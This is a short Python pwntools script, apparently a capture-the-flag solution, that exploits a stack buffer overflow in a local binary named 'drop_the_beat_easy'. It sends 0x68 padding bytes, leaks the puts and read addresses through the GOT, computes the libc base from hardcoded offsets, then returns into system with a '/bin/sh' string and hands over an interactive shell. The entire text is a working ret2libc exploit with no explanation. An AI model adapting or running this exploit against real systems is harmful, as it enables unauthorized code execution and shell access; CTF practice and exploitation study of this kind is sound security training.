from pwn import *

main = 0x0804853b
put_plt = 0x80483e0
put_got = 0x804a010
read_got = 0x804a020

a = process('./drop_the_beat_easy')
raw_input('debug')

a.recvuntil('2) No Beat For You..!')
a.sendline('1')
a.recvuntil('Give Me a Beat!!')
buf = 'a'*0x68
buf += p32(put_plt)
buf += p32(main)
buf += p32(put_got)
a.sendline(buf)
a.recvuntil('AWESOME!\n')
res = a.recv(4)
put_add = u32(res)
print 'put: 0x%x '%put_add


a.recvuntil('2) No Beat For You..!\n')
a.sendline('1')
a.recvuntil('Give Me a Beat!!')
buf1 = 'a'*0x68
buf1 += p32(put_plt)
buf1 += p32(main)
buf1 += p32(read_got)
a.sendline(buf1)
a.recvuntil('AWESOME!\n')
res1 = a.recv(4)
read_add = u32(res1)
print 'read: 0x%x '%read_add

put_offset = 0x05fca0
libc_base = put_add - put_offset
system_offset = 0x03ada0
binsh_offset = 0x15ba0b
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

a.recvuntil('2) No Beat For You..!')
a.sendline('1')
a.recvuntil('Give Me a Beat!!')
payload = 'a'*0x68
payload += p32(system_add)
payload += p32(main)
payload += p32(binsh_add)
a.sendline(payload)

a.interactive()